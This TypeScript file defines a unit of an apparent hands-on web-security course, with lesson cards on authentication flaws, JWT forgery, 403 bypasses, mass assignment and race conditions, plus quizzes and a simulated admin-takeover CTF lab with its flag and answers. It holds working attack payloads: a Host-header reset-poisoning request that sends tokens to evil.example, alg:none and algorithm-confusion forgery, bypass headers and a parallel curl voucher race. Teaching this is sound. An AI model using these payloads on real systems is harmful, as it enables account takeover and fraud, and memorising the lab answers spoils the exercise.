import type { Unit } from "../types";

const unit6: Unit = {
  id: "auth-access",
  index: 6,
  title: "Auth, Access & Logic Flaws",
  tagline: "The bugs that aren't in a scanner's wordlist.",
  tone: "offense",
  lessons: [
    {
      id: "broken-auth",
      title: "Broken authentication",
      summary: "Everything that can go wrong between 'who are you' and 'session cookie'.",
      cards: [
        {
          title: "The usual suspects",
          body: [
            "Account enumeration via login responses ('user not found' vs 'wrong password').",
            "Password reset tokens that are predictable, long-lived, reusable, or leaked via Referer / host-header injection.",
            "Rate limits on login applied only per-IP (bypass via X-Forwarded-For).",
            "MFA bypass by removing the MFA parameter, replaying the pre-MFA session, or racing the second-factor check.",
            "'Remember me' cookies that store the user id in plaintext.",
          ],
          tone: "offense",
          code: `# password-reset poisoning
POST /reset HTTP/1.1
Host: evil.example           ← reset email uses the Host header to build the link
X-Forwarded-Host: evil.example

→ email arrives containing https://evil.example/reset?t=<token>
→ victim clicks, you receive their token.`,
        },
        {
          title: "Session hygiene",
          body: [
            "Session should rotate on login (prevents session fixation).",
            "Session should invalidate server-side on logout — not just 'delete the cookie'.",
            "Multiple active sessions? Fine, but 'sign out everywhere' MUST actually invalidate every token.",
          ],
          tone: "defense",
        },
      ],
      exercises: [
        {
          type: "mc",
          q: "A password-reset email contains `https://{{Host}}/reset?t=<token>`. You change the Host header on your POST to attacker-controlled. What is the bug?",
          options: ["XSS", "Password-reset poisoning (host-header injection)", "CSRF", "IDOR"],
          answer: 1,
          explain:
            "The backend uses the Host header to build the reset URL. Change it, and the real user's token lands on your server.",
        },
        {
          type: "mc",
          q: "Login rate limit is per-IP. What single header bypasses it on badly-configured apps?",
          options: ["Content-Type", "X-Forwarded-For", "Accept", "Referer"],
          answer: 1,
          explain: "The app trusts the client-sent XFF for the rate-limit key. Rotate IPs via that header.",
        },
      ],
    },
    {
      id: "jwt",
      title: "JWTs: the bugs that keep paying",
      summary: "Base64 doesn't mean security.",
      cards: [
        {
          title: "The structure",
          body: [
            "A JWT is `base64url(header).base64url(payload).signature`.",
            "Header picks the algorithm (HS256, RS256, …). Payload has claims (sub, exp, role). Signature keeps anyone from forging the payload.",
          ],
          code: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIxMDAxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3MzM...}
.XlPZC2...sig...`,
        },
        {
          title: "The three classic bugs",
          body: [
            "`alg: none` — strip the signature, change role to admin, send. Libraries that still accept 'none' in 2026 exist.",
            "`alg: HS256` → `alg: RS256` confusion. Server used RSA public key to verify; if it falls back to HMAC with the public key as the secret, you can sign tokens yourself.",
            "`kid` injection — the key-id header can be a SQL fragment, path traversal, or point at a key you uploaded via another bug.",
          ],
          code: `# alg:none bypass
header  = {"alg":"none","typ":"JWT"}
payload = {"sub":"1001","role":"admin","exp":9999999999}
token   = b64(header) + "." + b64(payload) + "."

# alg confusion (RS256 → HS256)
pubkey = -----BEGIN PUBLIC KEY-----\\n...   # fetch from /.well-known/jwks.json
token  = HMAC-SHA256(pubkey, header+"."+payload)
→ server verifies with pubkey, matches, grants admin.`,
          tone: "offense",
        },
        {
          title: "Discovering what's inside",
          body: [
            "`jwt.io` (or `jwt_tool`) decodes any token in a second. The payload is base64, not encrypted — think of it as a signed cookie.",
            "Look for role, admin flag, tenant id, email. Any of them worth flipping?",
          ],
        },
      ],
      exercises: [
        {
          type: "mc",
          q: "A JWT uses `alg: HS256`. Your app serves its RSA public key at /.well-known/jwks.json. What attack is possible if the server doesn't restrict algorithms?",
          options: [
            "DoS",
            "RS256→HS256 algorithm confusion: sign tokens with the public key as HMAC secret",
            "SQLi",
            "SSRF",
          ],
          answer: 1,
          explain:
            "If the library picks the verification path by the header's alg claim, a lazy backend will HMAC-verify with the public key — which you have.",
        },
        {
          type: "fill",
          q: "What is the simplest JWT forgery when the server accepts `alg: none`?",
          answers: ["alg none", "none", "set alg to none"],
          explain: "Strip the signature, set alg to none, edit the payload. 2016 bug, still shipped in 2026.",
        },
      ],
    },
    {
      id: "access-control",
      title: "Access control bypasses",
      summary: "The 403 is lying.",
      cards: [
        {
          title: "A checklist for every 403",
          body: [
            "Change method: GET → POST → PUT → PATCH → DELETE → OPTIONS. Many stacks route all to the same handler and only check ACL on GET.",
            "Change URL: `/admin` → `/admin/`, `/Admin`, `/admin;x=y`, `/admin%20`, `/admin/./`, `/admin/..;/admin`.",
            "Add headers: `X-Original-URL: /admin`, `X-Rewrite-URL: /admin`, `X-Forwarded-For: 127.0.0.1`, `Referer: /admin`.",
            "Change user context: strip the Authorization header entirely, replace with a lower-privilege token, send both.",
            "Try the mobile/API variant: /api/v1/admin, /mobile/admin, /graphql with the same mutation.",
          ],
          tone: "offense",
        },
        {
          title: "Mass assignment",
          body: [
            "Backends often map incoming JSON directly onto a model. Add fields the UI never showed and watch the server honour them.",
          ],
          code: `PATCH /api/profile  { "name": "alice", "role": "admin" }
PATCH /api/profile  { "name": "alice", "email_verified": true }
PATCH /api/profile  { "name": "alice", "credits": 999999 }

if the backend uses model.update(req.body) blindly, you win.`,
          tone: "offense",
        },
        {
          title: "Business-logic flaws",
          body: [
            "No tool finds these. You read the app like a user and ask 'what if I...':",
            "- …apply the discount code twice? Three times?",
            "- …refund an item I already got refunded?",
            "- …change the price in the POST body?",
            "- …register a username with a trailing space, matching another user after trimming?",
            "- …race two 'claim the last item' requests?",
          ],
          tone: "offense",
        },
      ],
      exercises: [
        {
          type: "mc",
          q: "/admin returns 403. /admin/ returns 200. What is this called?",
          options: ["A CDN cache miss", "Access-control bypass via path normalization quirk", "A client-side bug", "Normal behaviour"],
          answer: 1,
          explain: "Classic. The ACL regex matched the exact string; the router didn't.",
        },
        {
          type: "mc",
          q: "`PATCH /api/profile {\"role\":\"admin\"}` succeeds and your role flips. What is this?",
          options: ["XSS", "Mass assignment", "SSRF", "A feature"],
          answer: 1,
          explain: "Mass assignment / parameter pollution. Common in Rails/Node when the dev uses `.update(body)` without an allowlist.",
        },
      ],
    },
    {
      id: "race-conditions",
      title: "Race conditions",
      summary: "Two requests arriving at the same millisecond beat one check.",
      cards: [
        {
          title: "The pattern",
          body: [
            "'Only one voucher per account' is checked, then applied. Fire 20 identical requests in a sub-second burst and some race past the check.",
            "'Only one refund per order', 'only one withdrawal from this balance', 'only one slot left in this room' — all susceptible.",
          ],
          code: `# Burp Suite "single-packet attack" (HTTP/2) fires N requests
# simultaneously, defeating 'already used' flags that aren't DB-level.

# ffuf / curl parallel:
seq 20 | xargs -n1 -P20 -I{} curl -s -X POST \\
  -b 'session=abc' https://shop.example/apply-voucher -d 'code=NEW50'`,
          tone: "offense",
        },
      ],
      exercises: [
        {
          type: "mc",
          q: "Which Burp Suite feature is purpose-built for race conditions in HTTP/2 apps?",
          options: ["Repeater", "Intruder — single-packet attack", "Decoder", "Comparer"],
          answer: 1,
          explain: "The single-packet attack sends many requests in one TCP window, nearly simultaneous.",
        },
      ],
    },
  ],
  lab: {
    id: "lab-auth",
    title: "CTF: admin takeover",
    tone: "offense",
    briefing: [
      "Target: https://shop.example/app",
      "You are a regular user. The admin panel has three ways in. Find any one. Flag format: FLAG{...}",
      "Hints are available after each failed check.",
    ],
    terminal: {
      host: "hunter@kali",
      commands: {
        "curl -i https://shop.example/app/":
          "Set-Cookie: token=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1MDAxIiwicm9sZSI6InVzZXIifQ.0bQ...sig\n<html>Welcome, user u001</html>",
        "echo 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1MDAxIiwicm9sZSI6InVzZXIifQ' | base64 -d":
          '{"alg":"HS256"}\n{"sub":"u001","role":"user"}',
        "jwt_tool eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1MDAxIiwicm9sZSI6InVzZXIifQ.0bQsig -X a":
          "[+] Trying alg:none bypass …\n[+] Forged token: eyJhbGciOiJub25lIn0.eyJzdWIiOiJ1MDAxIiwicm9sZSI6ImFkbWluIn0.",
        "curl -b 'token=eyJhbGciOiJub25lIn0.eyJzdWIiOiJ1MDAxIiwicm9sZSI6ImFkbWluIn0.' https://shop.example/app/admin":
          "HTTP/1.1 200 OK\n<h1>Admin dashboard</h1>\nFLAG{jwt_alg_none_still_1n_prod_2026}\n<a href='/app/admin/users'>users</a>",
        "curl -i https://shop.example/app/admin":
          "HTTP/1.1 403 Forbidden\n",
        "curl -i https://shop.example/app/admin/":
          "HTTP/1.1 200 OK\n<h1>Admin</h1>\n<p>Hint: /app/admin blocked by WAF prefix match; trailing slash slips past.</p>",
        "curl -i -H 'X-Original-URL: /app/admin' https://shop.example/app/anything":
          "HTTP/1.1 200 OK\n<h1>Admin</h1>\n<p>Hint: router honoured X-Original-URL; WAF saw /anything.</p>",
        "curl -X PATCH -b 'token=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1MDAxIiwicm9sZSI6InVzZXIifQ.0bQsig' https://shop.example/app/profile -d '{\"role\":\"admin\"}' -H 'Content-Type: application/json'":
          "HTTP/1.1 200 OK\n{\"id\":\"u001\",\"role\":\"admin\",\"email\":\"u001@shop.example\"}\n(hint: mass assignment)",
      },
      hints: [
        "curl -i https://shop.example/app/",
        "echo 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1MDAxIiwicm9sZSI6InVzZXIifQ' | base64 -d",
        "jwt_tool eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1MDAxIiwicm9sZSI6InVzZXIifQ.0bQsig -X a",
        "curl -i https://shop.example/app/admin",
        "curl -i https://shop.example/app/admin/",
        "curl -i -H 'X-Original-URL: /app/admin' https://shop.example/app/anything",
        "curl -X PATCH -b 'token=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1MDAxIiwicm9sZSI6InVzZXIifQ.0bQsig' https://shop.example/app/profile -d '{\"role\":\"admin\"}' -H 'Content-Type: application/json'",
        "curl -b 'token=eyJhbGciOiJub25lIn0.eyJzdWIiOiJ1MDAxIiwicm9sZSI6ImFkbWluIn0.' https://shop.example/app/admin",
      ],
    },
    tasks: [
      {
        q: "What algorithm does the JWT use before you tamper it?",
        answers: ["hs256", "HS256"],
        hint: "Decode the header.",
      },
      {
        q: "Which claim do you flip to escalate privilege?",
        answers: ["role", "role claim"],
        hint: "Decode the payload.",
      },
      {
        q: "Name the three bypass techniques this lab demonstrates (comma-separated, any order).",
        answers: [
          "alg none, trailing slash, x-original-url",
          "jwt alg none, trailing slash, x-original-url",
          "alg none, path, header",
        ],
        hint: "Trailing slash on /admin, X-Original-URL header, and the JWT trick.",
      },
      {
        q: "What is the flag?",
        answers: ["FLAG{jwt_alg_none_still_1n_prod_2026}", "jwt_alg_none_still_1n_prod_2026"],
        hint: "Visit /app/admin with the forged alg:none token.",
      },
    ],
  },
  ids: {
    name: "Access toolkit",
    description:
      "You can break authentication, forge JWTs three ways, bypass access controls, and spot business-logic & race-condition bugs.",
    rules: [],
  },
};

export default unit6;
